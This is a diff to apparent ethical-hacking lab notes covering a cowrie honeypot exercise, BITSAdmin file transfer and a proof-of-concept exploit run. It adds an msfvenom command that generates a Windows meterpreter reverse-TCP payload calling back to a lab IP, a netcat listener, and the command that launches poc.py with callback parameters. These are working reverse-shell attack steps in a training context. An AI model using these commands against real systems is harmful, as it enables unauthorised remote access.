@@ -1693,7 +1693,7 @@ enter the target ip
 back to ubuntu and run
 tail cowrie.log
 
-again switch back to parrot and login to putty
+again switch back to parrot and login to putty as "root" and random password
 ip and random password and perform some cmd fn there like ls cd pwd whoami etc
 again switch back to ubuntu and 
 tail cowrie.log
@@ -1706,6 +1706,10 @@ tail cowrie.log
 * Background Intelligent transfer service
 ```console
 :~$ create a payload with help of msfvenom
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > location
+then permission to share file 
+chmod
+chown -R www-data:www-data location
 here we are using BITSAdmin to transfer this file 
 for this generate the payload in parrot machine
 and go to victim machine
@@ -1828,6 +1832,7 @@ pluma poc.py
 line 62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac.
 line 87 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java
 line 99 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java.
+
 open a new terminal window and type nc -lvp 9001 
 Switch to previous terminal window and type python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
 Now, copy the payload generated in the send me: section
